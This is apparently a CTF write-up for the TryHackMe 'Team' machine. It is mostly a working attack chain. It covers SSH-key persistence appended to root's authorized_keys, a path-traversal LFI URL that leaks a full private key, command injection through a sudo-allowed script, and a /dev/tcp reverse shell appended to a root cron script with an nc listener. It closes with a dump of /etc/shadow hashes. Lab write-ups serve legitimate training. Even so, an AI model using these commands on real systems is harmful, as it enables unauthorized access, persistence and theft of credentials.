### New Usable SSH Pub Keys

> add to ~/.ssh/authorized_keys


User
```
echo -e "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC8aG6vhChg0Cg5+GqsQSuHPKwQUh/MEPQGBqB8Tkz9gs4X+HRX0wNpvKUhYkauHzLsU1VDB7+k0dz/bi2gMrQX8X0H2DQWpEdQmeIzDZUZRkiSHqXamvo2h6J1Or7O11bIv3nKaABEn8m5GE4S8TvV/XalzFQUG/MQ616xHQyndz4M6lffs/6zd8l+quP+BSRlQ9CKbD96CkTWo0HNw9asjqNMG8zUNAzKqDzr3w+v3nff+MwAkVS6nuF3ouoy7eFT9j+lhz3+xpR3yy+ikWEZ92U78zclCPf93vMyZOGVzxxNlReFtczEvkdlP6Tv2Q8Iwsd926vxZeOt8slfcrqYR3imXOPUFy7mphgrn8Ckk2fDreLD97T9TnALbPyPuZ9fWd3Gr1V1LbXLsIhPKEon40HPTbnq2xzblwC7IiVeKVsfOZT8aga4hvVI7Ni97w5Fp5hJ2N8Av3vEbbrHXBF7D83VRTcJI+wQ1YLbrmSIZRwvXX1LWvpBgyFRvTGXl1/b7ErZ2FpIOhiBWpHFthM1XrN58dg+eS5LF5SOpITZZiXAP4JQpBNaTQRDLeRCiR96C5mjh/4A9rzWcws22gFA4IHBWPBZWTxpYm1DB77TNLNbPWt7786J5YL1Tvx3+wm4MNZKUkammmSqUAReNZJkMpTvyCddaNjiPbrxnP9O+Q== your_email@example.com" >> /home/user/.ssh/authorized_keys

```

Root
```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC1r1dwTwiSkBa+LkiYEaZKHrBjE2daoFTW9v9qcq/XtOhowhcDJkjZwd8CF6WDJV4VcSGRFg+AEJcn3dd4RfNLrl/54qi8Bc779HhBFBqTcR9rY3byBvCMkK5K8qNziodPYkzSJQ2w0j8Z4+Vs++DHKhyrXISSzr21mmE2LaPpKmND16DsTHQMJjnC1lWEGH8VsXb6bMYOpI+JJwo0vAfyDZR1Rfx0+4MIPHORvMbwgxamCoGqMfYQzc1GU2UM9xoQS7ZQLvwNaaSFGv7JBWl8Xy5Y8WjrWpEGAnjaQRdSTcwj47joqRPzle3pjLyJHpitDqxVOC3b/e82LUWsMKFhF/NMFoBLL78vBRYsmlBQfIvWgLeIGtFbx2hpeb1Qrml25Dl6M35SAQpWwJrW/o7CrSPiOtKxhNzbGzVWgsbygpfBsC2Z3OiodFHYcSPQvSZLxgHcBikQYEoUWGuscvVwu8uMHl3u0YqfHnqVwsvWaTGcadWwMHPgcXg70aXhi5TiQbAo0Dj+SFWAacfIm+DBfBV3ePf2LubfrWho8uxMR1d//UXVT/VJ9waFZpOQc2ayI3An58RWPJJvedPrkdr1lWSUOQ5L6D9X4kyscfvCUByIAfELOSykE1kfvWQM0pGm3N33elOx5t78UbWpvtBVbTVkSy5I7XtcXzuIkUZDtw== your_email@example.com" >> /root/.ssh/authorized_keys
```


try to get private files from dale like id_rsa, does not work

```
http://dev.team.thm/script.php?page=/../../../../../home/dale/.ssh/id_rsa
```


need to get burpsuite to automate looking for important files... need a wordlist of important system and config files in linux and windows to enumerate


```
http://dev.team.thm/script.php?page=/../../../../../etc/ssh/sshd_config
```

```
# $OpenBSD: sshd_config,v 1.101 2017/03/14 07:19:07 djm Exp $ # This is the sshd server system-wide configuration file. See # sshd_config(5) for more information. # This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin # The strategy used for options in the default sshd_config shipped with # OpenSSH is to specify options with their default value where # possible, but leave them commented. Uncommented options override the # default value. #Port 22 #AddressFamily any #ListenAddress 0.0.0.0 #ListenAddress :: #HostKey /etc/ssh/ssh_host_rsa_key #HostKey /etc/ssh/ssh_host_ecdsa_key #HostKey /etc/ssh/ssh_host_ed25519_key # Ciphers and keying #RekeyLimit default none # Logging #SyslogFacility AUTH #LogLevel INFO # Authentication: #RSAAuthentication yes #LoginGraceTime 2m PermitRootLogin without-password #StrictModes yes #MaxAuthTries 6 #MaxSessions 10 PubkeyAuthentication yes PubkeyAcceptedKeyTypes=+ssh-dss # Expect .ssh/authorized_keys2 to be disregarded by default in future. #AuthorizedKeysFile /home/%u/.ssh/authorized_keys #AuthorizedPrincipalsFile none #AuthorizedKeysCommand none #AuthorizedKeysCommandUser nobody # For this to work you will also need host keys in /etc/ssh/ssh_known_hosts #HostbasedAuthentication no # Change to yes if you don't trust ~/.ssh/known_hosts for # HostbasedAuthentication #IgnoreUserKnownHosts no # Don't read the user's ~/.rhosts and ~/.shosts files #IgnoreRhosts yes # To disable tunneled clear text passwords, change to no here! #PasswordAuthentication yes #PermitEmptyPasswords no # Change to yes to enable challenge-response passwords (beware issues with # some PAM modules and threads) ChallengeResponseAuthentication no # Kerberos options #KerberosAuthentication no #KerberosOrLocalPasswd yes #KerberosTicketCleanup yes #KerberosGetAFSToken no # GSSAPI options #GSSAPIAuthentication no #GSSAPICleanupCredentials yes #GSSAPIStrictAcceptorCheck yes #GSSAPIKeyExchange no # Set this to 'yes' to enable PAM authentication, account processing, # and session processing. If this is enabled, PAM authentication will # be allowed through the ChallengeResponseAuthentication and # PasswordAuthentication. Depending on your PAM configuration, # PAM authentication via ChallengeResponseAuthentication may bypass # the setting of "PermitRootLogin without-password". # If you just want the PAM account and session checks to run without # PAM authentication, then enable this but set PasswordAuthentication # and ChallengeResponseAuthentication to 'no'. UsePAM no #AllowAgentForwarding yes #AllowTcpForwarding yes #GatewayPorts no X11Forwarding yes #X11DisplayOffset 10 #X11UseLocalhost yes #PermitTTY yes PrintMotd no #PrintLastLog yes #TCPKeepAlive yes #UseLogin no #PermitUserEnvironment no #Compression delayed #ClientAliveInterval 0 #ClientAliveCountMax 3 #UseDNS no #PidFile /var/run/sshd.pid #MaxStartups 10:30:100 #PermitTunnel no #ChrootDirectory none #VersionAddendum none # no default banner path #Banner none # Allow client to pass locale environment variables AcceptEnv LANG LC_* # override default of no subsystems Subsystem sftp /usr/lib/openssh/sftp-server # Example of overriding settings on a per-user basis #Match User anoncvs # X11Forwarding no # AllowTcpForwarding no # PermitTTY no # ForceCommand cvs server AllowUsers dale gyles #Dale id_rsa #-----BEGIN OPENSSH PRIVATE KEY----- #b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn #NhAAAAAwEAAQAAAYEAng6KMTH3zm+6rqeQzn5HLBjgruB9k2rX/XdzCr6jvdFLJ+uH4ZVE #NUkbi5WUOdR4ock4dFjk03X1bDshaisAFRJJkgUq1+zNJ+p96ZIEKtm93aYy3+YggliN/W #oG+RPqP8P6/uflU0ftxkHE54H1Ll03HbN+0H4JM/InXvuz4U9Df09m99JYi6DVw5XGsaWK #o9WqHhL5XS8lYu/fy5VAYOfJ0pyTh8IdhFUuAzfuC+fj0BcQ6ePFhxEF6WaNCSpK2v+qxP #zMUILQdztr8WhURTxuaOQOIxQ2xJ+zWDKMiynzJ/lzwmI4EiOKj1/nh/w7I8rk6jBjaqAu #k5xumOxPnyWAGiM0XOBSfgaU+eADcaGfwSF1a0gI8G/TtJfbcW33gnwZBVhc30uLG8JoKS #xtA1J4yRazjEqK8hU8FUvowsGGls+trkxBYgceWwJFUudYjBq2NbX2glKz52vqFZdbAa1S #0soiabHiuwd+3N/ygsSuDhOhKIg4MWH6VeJcSMIrAAAFkNt4pcTbeKXEAAAAB3NzaC1yc2 #EAAAGBAJ4OijEx985vuq6nkM5+RywY4K7gfZNq1/13cwq+o73RSyfrh+GVRDVJG4uVlDnU #eKHJOHRY5NN19Ww7IWorABUSSZIFKtfszSfqfemSBCrZvd2mMt/mIIJYjf1qBvkT6j/D+v #7n5VNH7cZBxOeB9S5dNx2zftB+CTPyJ177s+FPQ39PZvfSWIug1cOVxrGliqPVqh4S+V0v #JWLv38uVQGDnydKck4fCHYRVLgM37gvn49AXEOnjxYcRBelmjQkqStr/qsT8zFCC0Hc7a/ #FoVEU8bmjkDiMUNsSfs1gyjIsp8yf5c8JiOBIjio9f54f8OyPK5OowY2qgLpOcbpjsT58l #gBojNFzgUn4GlPngA3Ghn8EhdWtICPBv07SX23Ft94J8GQVYXN9LixvCaCksbQNSeMkWs4 #xKivIVPBVL6MLBhpbPra5MQWIHHlsCRVLnWIwatjW19oJSs+dr6hWXWwGtUtLKImmx4rsH #ftzf8oLErg4ToSiIODFh+lXiXEjCKwAAAAMBAAEAAAGAGQ9nG8u3ZbTTXZPV4tekwzoijb #esUW5UVqzUwbReU99WUjsG7V50VRqFUolh2hV1FvnHiLL7fQer5QAvGR0+QxkGLy/AjkHO #eXC1jA4JuR2S/Ay47kUXjHMr+C0Sc/WTY47YQghUlPLHoXKWHLq/PB2tenkWN0p0fRb85R #N1ftjJc+sMAWkJfwH+QqeBvHLp23YqJeCORxcNj3VG/4lnjrXRiyImRhUiBvRWek4o4Rxg #Q4MUvHDPxc2OKWaIIBbjTbErxACPU3fJSy4MfJ69dwpvePtieFsFQEoJopkEMn1Gkf1Hyi #U2lCuU7CZtIIjKLh90AT5eMVAntnGlK4H5UO1Vz9Z27ZsOy1Rt5svnhU6X6Pldn6iPgGBW #/vS5rOqadSFUnoBrE+Cnul2cyLWyKnV+FQHD6YnAU2SXa8dDDlp204qGAJZrOKukXGIdiz #82aDTaCV/RkdZ2YCb53IWyRw27EniWdO6NvMXG8pZQKwUI2B7wljdgm3ZB6fYNFUv5AAAA #wQC5Tzei2ZXPj5yN7EgrQk16vUivWP9p6S8KUxHVBvqdJDoQqr8IiPovs9EohFRA3M3h0q #z+zdN4wIKHMdAg0yaJUUj9WqSwj9ItqNtDxkXpXkfSSgXrfaLz3yXPZTTdvpah+WP5S8u6 #RuSnARrKjgkXT6bKyfGeIVnIpHjUf5/rrnb/QqHyE+AnWGDNQY9HH36gTyMEJZGV/zeBB7 #/ocepv6U5HWlqFB+SCcuhCfkegFif8M7O39K1UUkN6PWb4/IoAAADBAMuCxRbJE9A7sxzx #sQD/wqj5cQx+HJ82QXZBtwO9cTtxrL1g10DGDK01H+pmWDkuSTcKGOXeU8AzMoM9Jj0ODb #mPZgp7FnSJDPbeX6an/WzWWibc5DGCmM5VTIkrWdXuuyanEw8CMHUZCMYsltfbzeexKiur #4fu7GSqPx30NEVfArs2LEqW5Bs/bc/rbZ0UI7/ccfVvHV3qtuNv3ypX4BuQXCkMuDJoBfg #e9VbKXg7fLF28FxaYlXn25WmXpBHPPdwAAAMEAxtKShv88h0vmaeY0xpgqMN9rjPXvDs5S #2BRGRg22JACuTYdMFONgWo4on+ptEFPtLA3Ik0DnPqf9KGinc+j6jSYvBdHhvjZleOMMIH #8kUREDVyzgbpzIlJ5yyawaSjayM+BpYCAuIdI9FHyWAlersYc6ZofLGjbBc3Ay1IoPuOqX #b1wrZt/BTpIg+d+Fc5/W/k7/9abnt3OBQBf08EwDHcJhSo+4J4TFGIJdMFydxFFr7AyVY7 #CPFMeoYeUdghftAAAAE3A0aW50LXA0cnJvdEBwYXJyb3QBAgMEBQYH #-----END OPENSSH PRIVATE KEY-----
```

dale's id rsa after some editing

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

```


successful login

```
ssh -i dale_id_rsa dale@team.thm
```

/home/dale/user.txt

```
THM{6Y0TXHz7c2d}
```

we can run /home/gyles/admin_checks with sudo privileges and no password

```
dale@TEAM:~$ sudo -l
Matching Defaults entries for dale on TEAM:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dale may run the following commands on TEAM:
    (gyles) NOPASSWD: /home/gyles/admin_checks
```


its a bash script

```
dale@TEAM:/home/gyles$ file admin_checks
admin_checks: Bourne-Again shell script, ASCII text executable
```

we cannot edit it

```
-rwxr--r-- 1 gyles editors 399 Jan 15  2021 admin_checks
```

the contents 

```
#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"
```

also, we have to run the file as gyles in order to run with sudo

```
sudo -u gyles /home/gyles/admin_checks
```

due to the following line, we can input a file path when prompted to enter the date whille running the script. This line will execute the value of the $error variable. we can input /bin/bash to get a basic shell

```
$error 2>/dev/null
```

upgrade the shell

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

this is what the output looks like

```
dale@TEAM:/dev/shm$ sudo -u gyles /home/gyles/admin_checks
Reading stats.
Reading stats..
Enter name of person backing up the data: dale
Enter 'date' to timestamp the file: /bin/bash
The Date is python3 -c 'import pty; pty.spawn("/bin/bash")'
gyles@TEAM:/dev/shm$ whoami
gyles
gyles@TEAM:/dev/shm$ uname -a
Linux TEAM 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
gyles@TEAM:/dev/shm$
```


from /home/gyles/.bash_history

```
nano /usr/local/sbin/dev.backup.sh 
cat /usr/local/sbin/dev.backup.sh 
cat /usr/local/bin/main_backup.sh
cat /opt/admin_stuff/script.sh 
nano /usr/local/sbin/dev.backup.sh
```


```
cat /opt/admin_stuff/script.sh 
```

it is owned by root

```
-rwxr--r-- 1 root root 200 Jan 17  2021 /opt/admin_stuff/script.sh
```

```
!/bin/bash
#I have set a cronjob to run this script every minute


dev_site="/usr/local/sbin/dev_backup.sh"
main_site="/usr/local/bin/main_backup.sh"
#Back ups the sites locally
$main_site
$dev_site
```

from /etc/crontab

```
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
```

can't do much with that script file

also from bash history

```
cat /usr/local/bin/main_backup.sh
```

```
-rwxrwxr-x 1 root admin 65 Jan 17  2021 /usr/local/bin/main_backup.sh
```

gyles is part of the *admin* group that can edit and execute this script. the owner is root, so we might be able to get a shell as root

```
AdminIdentities=unix-group:sudo;unix-group:admin
```

also in the crontab file

```
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```

command to add a reverse shell to the file

```
echo "sh -i >& /dev/tcp/10.6.24.127/1337 0>&1" >> /usr/local/bin/main_backup.sh
```

setup a listener on attacker machines

```
nc -lvnp 1337
```

we get a root shell on our listener

```
listening on [any] 1337 ...
connect to [10.6.24.127] from (UNKNOWN) [10.10.50.204] 35418
sh: 0: can't access tty; job control turned off
# whoami
root
# uname -a
sudoLinux TEAM 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```


/root/root.txt

```
THM{fhqbznavfonq}
```


```
root:$6$xuuJwXec$qc1o9t6ZiJgSSp37ODrG4WBnE8schSnQ/IHiWvLNo/w42X2U9WkMR689AXYkN.wwM83yTDRQ3rCtTlz1mN9rm0:18644:0:99999:7:::
daemon:*:17647:0:99999:7:::
bin:*:17647:0:99999:7:::
sys:*:17647:0:99999:7:::
sync:*:17647:0:99999:7:::
games:*:17647:0:99999:7:::
man:*:17647:0:99999:7:::
lp:*:17647:0:99999:7:::
mail:*:17647:0:99999:7:::
news:*:17647:0:99999:7:::
uucp:*:17647:0:99999:7:::
proxy:*:17647:0:99999:7:::
www-data:*:17647:0:99999:7:::
backup:*:17647:0:99999:7:::
list:*:17647:0:99999:7:::
irc:*:17647:0:99999:7:::
gnats:*:17647:0:99999:7:::
nobody:*:17647:0:99999:7:::
systemd-network:*:17647:0:99999:7:::
systemd-resolve:*:17647:0:99999:7:::
syslog:*:17647:0:99999:7:::
messagebus:*:17647:0:99999:7:::
_apt:*:17647:0:99999:7:::
lxd:*:18642:0:99999:7:::
uuidd:*:18642:0:99999:7:::
dnsmasq:*:18642:0:99999:7:::
landscape:*:18642:0:99999:7:::
pollinate:*:18642:0:99999:7:::
dale:$6$OD7sttk0$u3wdqLBRI6wyHQg610OgQvG/kga9w4xx90YQ4lVYZsQ4txK3qfBnhGL2N5DOFPA7qfMQuLZpB.dpNL7beqAtk0:18644:0:99999:7:::
gyles:$6$fEb0A7IP$U/eT3u7lo3OiDr/ssF.VxtSYb/n.vaqUjehRP.R7XqvsTSYW5YFIgL8G8UPO.YxVsSUVAXAgwe86p4PqxBoGR.:18644:0:99999:7:::
ftpuser:$6$4uqJHENY$pGEGsZOmkquSGZdvHe7lZibsSCoXSvJ6wZ.LhJiFRA.R4Jy1FfbG5nBK/Y41uT/XyPL3T36XigwMquL8XB90r.:18642:0:99999:7:::
ftp:*:18642:0:99999:7:::
sshd:*:18642:0:99999:7:::
```